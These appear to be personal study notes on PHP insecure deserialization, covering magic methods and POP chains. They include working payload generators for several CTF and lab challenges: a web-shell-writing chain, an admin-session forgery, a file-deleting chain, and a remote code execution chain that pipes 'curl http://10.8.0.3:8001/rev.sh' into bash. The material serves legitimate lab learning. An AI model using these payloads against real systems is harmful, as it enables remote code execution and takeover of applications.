------------

### Feeling funky and decided to learn Insecure Deserialization

------------

- Unserialize under the hood-:
 - Understand with php magic methods-: They are methods with magical properties.The magic methods that are relevant for us now are __wakeup() and __destruct(). If the class of the serialized object implements any method named __wakeup() and __destruct(), these methods will be executed automatically when unserialize() is called on an object.
 - function. __wakeup() reconstructs any resources that the object may have. It is used to reestablish any database connections that have been lost during serialization and perform other reinitialization tasks.
 - The program operates on the object and uses it to perform other actions.
 - Finally, when no reference to the deserialized object instance exists, __destruct() is called to clean up the object.
 - To exploit insecure deserialization, you need to control the application flow by controlling the values passed into automatically executed methods like `__wakeup()` and `__destruct()`.

- Accessing Private Classes-:
  - Vuln code-:

```php
class Example2
{
  private $hook;
  function __construct(){
      // some PHP code...
  }
  function __wakeup(){\
      if (isset($this->hook)) eval($this->hook);
  }
}
// some PHP code...
$user_data = unserialize($_COOKIE['data']);
// some PHP code...
```

- Accessing private fields in php-:

```php
<?php
class Example2
{
  private $hook;
  function __construct(){
      // some PHP code...
  }
  function __wakeup(){
      if (isset($this->hook)) echo eval($this->hook);
  }
}
$example2 = new ReflectionClass('Example2');
$obj = $example2->newInstanceWithoutConstructor();
$prop= $example2->getProperty('hook');
$prop->setAccessible(true);
$prop->setValue($obj,'');
echo base64_encode(serialize($obj));
?>
```

-------------

### PHP POP Chains

--------------

- In a nutshell, when an attacker controls a serialized object that is passed into unserialize(), she can control the properties of the created object. This will then allow her the opportunity to hijack the flow of the application, by controlling the values passed into magic methods like __wakeup().
- Unfortunately, even if the magic methods themselves are not exploitable, an attacker could still wreak havoc using something called POP chains. POP stands for Property Oriented Programming, and the name comes from the fact that the attacker can control all of the properties of the deserialized object. Similar to ROP attacks (Return Oriented Programming), POP chains work by chaining code “gadgets” together to achieve the attacker’s ultimate goal. These “gadgets” are code snippets borrowed from the codebase that the attacker uses to further her goals.

- Pop Chain-:

```php
<?
// some PHP code...
class CodeSnippet{
	private $code = "phpinfo();";
}
class Example {
	private $obj;

	function __construct() {
		$this->obj = new CodeSnippet();
	}
}

echo urlencode(serialize(new Example));
?>
```
--------------

### Core Concepts-:

---------------

- Concept-:

```php
private variables are serialized as \x00ClassName\x00VariableName
protected variables are serialized as \x00*\x00VariableName
public variables are serialized as: VariableName
Classes in PHP are case-insensitive

__sleep() //Triggered before an object is serialized.  
__wakeup()   //Called immediately after an object is deserialized.
From PHP 7.4 onward, if both __unserialize() and __wakeup() exist, only __unserialize() is executed. __wakeup() is ignored.。
__construct() //when an object is created
__destruct() //when an object is destroyed
__toString()： //Runs when an object is used as a string (e.g., echo $object).
__call() //Triggered when calling a non-accessible method in an object context.
__callStatic() //Triggered when calling a non-accessible static method.
__get() //Used to read data from inaccessible properties (either private or non-existent).
__set() //Used to write data to inaccessible properties.
__isset() //Called when isset() or empty() is used on an inaccessible property.
__unset() //Called when unset() is used on an inaccessible property.
__invoke() //Activated when an object is called as a function (e.g., $object()).
```

--------------

### HTB POP Restaurant Solution

---------------

- Solution-:

```php
<?php

//Array helpers
require_once 'Helpers/ArrayHelpers.php';
use Helpers\ArrayHelpers;

//Icecream
class IceCream {
	public $flavors;
	public $topping;
}

//Spaghetti

class Spaghetti
{
    public $sauce;
    public $noodles;
    public $portion;
}
//Trigger point:__destruct

class Pizza {
	public $price;
	public $cheese;
	public $size;
}

//Array Helpers
$payload =  new ArrayHelpers(["cat /*_flag.txt"]);
$payload->callback = 'system';

$icecream =  new IceCream;
$icecream->flavors = $payload;
$icecream->topping = 'lolzz';

$spag = new Spaghetti;
$spag->sauce = $icecream;
$spag->noodles = 'indomie';
$spag->portion = '1999';

$pizza = new Pizza;
$pizza->size = $spag;
$pizza->cheese = 'nada';
$pizza->price = '12212';

echo base64_encode(serialize($pizza));

?>
```
--------------

### Pwned Bobby on flagyard

---------------

- Pop Chain-:

```php
<?php
class ChessGame {
    public $position = "/flag.txt";
}

class PositionAnalyzer {
    public $gameRecord = "swissfish";
    public $currentPosition;   
} 

$chess = new ChessGame;
$analyzePosition = new PositionAnalyzer;
$analyzePosition->currentPosition = $chess;

echo base64_encode(serialize($analyzePosition));
```

- Class `ChessGame` magic method "__toString" read files with `file_get_contents`-:

```php
class ChessGame {
    public $position;
    
    public function __construct($position) {
        $this->position = $position;
    }

    public function __toString() {
        return file_get_contents($this->position);
    }
}
```

- `__toString()` can only get triggered if it is treated as a string which brings us to class `PositonAnalyzer` which treats attributes `position` as a string, that is the point that we will pass `ChessGame` to.Also, it is being passed to `__destruct` which is executed after an object has been destroyed.That's our trigger point.

```php
class PositionAnalyzer {
    public $gameRecord;
    public $currentPosition;
    
    public function __construct($record) {
        $this->gameRecord = $record;
    }

    public function validateMove($position) {
        $this->currentPosition = $position;
    }

    public function __destruct() {
        if ($this->currentPosition) {
            echo $this->currentPosition;
        }
    }
}
```
-------------

### TCP1P Old Ctf

--------------

- Dealing with private functions, [source code](https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/blob/main/Web/Un%20Secure/dist.zip)

```php
<?php
require('vendor/autoload.php');

$gadgetone = new \GadgetOne\Adders(1);
$gadgettwo =  new \GadgetTwo\Echoers();
$gadgetthree = new \GadgetThree\Vuln();

//Setup gadget1
$vuln = new \GadgetThree\Vuln();
$reflection = new \ReflectionClass($gadgetthree);
$property = $reflection->getProperty('waf1');
$property->setAccessible(true);
$property->setValue($vuln,1);
$property = $reflection->getProperty('waf2');
$property->setAccessible(true);
$property->setValue($vuln,"\xde\xad\xbe\xef");
$property = $reflection->getProperty('waf3');
$property->setAccessible(true);
$property->setValue($vuln,false);
$vuln->cmd = "system('ls');";

//Gadget two
$echoers = new \GadgetOne\Adders(1);
$reflection = new \ReflectionClass($echoers);
$property = $reflection->getProperty('x');
$property->setAccessible(true);
$property->setValue($echoers,$vuln);

//setup trigger point __destruct
$trigger = new \GadgetTwo\Echoers();
$reflection =  new \ReflectionClass($trigger);
$property = $reflection->getProperty("klass");
$property->setAccessible(true);
$property->setValue($trigger,$echoers);

echo base64_encode(serialize($trigger));
?>
```
--------------

### Local Challenge created by someone

-------------

- Chain-:

```php
<?php
require('includes\bootstrap.php');
$gadgetuser =  new User('<?php `$_GET["die"]`;?>','supersecret');
$gadgetlogger  =  new Logger;

//setting up gadget Logger

$logger = new Logger;
$reflection =  new \ReflectionClass($gadgetlogger);
$property =  $reflection->getProperty("logFile");
$property->setAccessible(true);
$property->setValue($logger,'pixxed.php');
$property = $reflection->getProperty('logData');
$property->setAccessible(true);
$property->setValue($logger,['<?php system($_GET["die"]);?>']);
//setting up gadget  user
$user =  new User('`ls`','supersecret');
$reflection =  new \ReflectionClass($gadgetuser);
$property =  $reflection->getProperty('isAdmin');
$property->setAccessible(true);
$property->setValue($user,true);
//setting logger private data
$property = $reflection->getProperty('logger');
$property->setAccessible(true);
$property->setValue($user,$logger);
echo base64_encode(serialize($user));
?>
```

- [Source Code](https://github.com/HeavyGhost-le/PHP_deserialization_web_chall.git)

--------------

### Jmoraissec

---------------

- Pop chain-:

```php
<?php

Class _Text
{
	private $filename;

	public function __construct($filename)
  {
    $this->filename = "";
  }

	public function __toString()
	{
		$path = "./" . trim($this->filename) . ".txt";
      if (file_exists($path))
        echo file_get_contents($path);
  }
}

$gadgetfilename = new _Text("flag");

$filename = new _Text("flag");
$reflection = new ReflectionClass($gadgetfilename);
$property = $reflection->getProperty("filename");
$property->setAccessible(true);
$property->setValue($filename,"flag");

echo urlencode(serialize($filename));

?>
```

-  [Source Code](https://github.com/jmoraissec/ctf-insecure-deserialization)

---------------

### Portswigger php custom gadget chain

----------------

-  Source Code-:

```php
<?php
include("customtemplate.php");
$default_map = new DefaultMap("system");
$gadgetcustomTemp  = new CustomTemplate();

$customTemp =  new CustomTemplate('ls');
$reflection =  new \ReflectionClass($customTemp);
$property = $reflection->getProperty("desc");
$property->setAccessible(true);
$property->setValue($customTemp,$default_map);
$property = $reflection->getProperty("default_desc_type");
$property->setAccessible(true);
$property->setValue($customTemp,'rm /home/carlos/morale.txt');

echo base64_encode(serialize($customTemp));
?>
```
----------------

###  SEC DOJO Serial chain

----------------

- Privesc chain-:

```php
<?php
//User class
class User {
    private $id;
    private $email;
    private $role;
    private $firstName;
    private $lastName;
    private $createdAt;

    public function __construct($id, $email, $role = 'user', $firstName = '', $lastName = '', $phone = '', $createdAt = '') {
        $this->id = $id;
        $this->email = $email;
        $this->role = $role;
        $this->firstName = $firstName;
        $this->lastName = $lastName;
        $this->createdAt = $createdAt;
    }
}
//UserSession class
class UserSession {
    private $user;
    private $sessionId;
    private $createdAt;
    
    public function __construct($user, $sessionId = null) {
        $this->user = $user;
        $this->sessionId = $sessionId ?: uniqid('session_');
        $this->createdAt = time();
    }
}
//prepping User up
$user =  new User('3','me@gmail.com','admin','me','me@gmail,com','0810999599','');

//prepping UserSession
$usersession =  new UserSession($user,'session_6887b7864bbac');

echo urlencode(base64_encode(serialize($usersession)));
?>
```

- RCE_chain-:

```php
<?php
class MessageTemplate {
    public $template_engine; 
    public $variables;       
    public $rendered_content;
    public $template_name;
    public $template_type;

    public function __construct($engine_type = 'HTML_RENDERER', $name = '', $type = 'notification') {
        $this->variables = '';
        $this->template_engine = $engine_type;
        $this->template_name = $name;
        $this->template_type = $type;
        $this->render_template();
    }

    public function __sleep() {
        return ["template_engine", "variables", "template_name", "template_type"];
    }

    public function __wakeup() {
        $this->render_template();
    }

    private function render_template() {
        $this->rendered_content = new RenderedMessage($this->template_engine, $this->variables);
    }
    public function setContent($html, $text, $subject) {
        $this->variables->HTML_RENDERER = $html;
        $this->variables->TEXT_RENDERER = $text;
        $this->variables->EMAIL_RENDERER = $subject;
        $this->render_template();
    }

    public function getHtmlContent() {
        return $this->variables->HTML_RENDERER;
    }

    public function getTextContent() {
        return $this->variables->TEXT_RENDERER;
    }

    public function getSubject() {
        return $this->variables->EMAIL_RENDERER;
    }
}

class RenderedMessage {
    public $content;
    public $metadata;

    public function __construct($engine_type, $variables) {
        $this->content = $variables->$engine_type;
        $this->metadata = [
            'engine' => $engine_type,
            'rendered_at' => date('Y-m-d H:i:s'),
            'version' => '1.0'
        ];
    }
}
class SystemExecutor {
    private $command_handler;

    public function __construct($handler) {
        $this->command_handler = $handler;
    }

    public function __get($name) {
        return call_user_func($this->command_handler, $name);
    }
}
//SystemExecutor
$executor = new SystemExecutor('system');
$template = new MessageTemplate('curl http://10.8.0.3:8001/rev.sh | bash');
$template->variables = $executor;
echo urlencode(base64_encode(serialize($template)));
?>
```

----------------

### Sauce

--------------

- [Og Vickie li](https://vickieli.dev/insecure%20deserialization/pop-chains/)
- [Chenxi(someOG Chinese Dude)](https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)

-------------
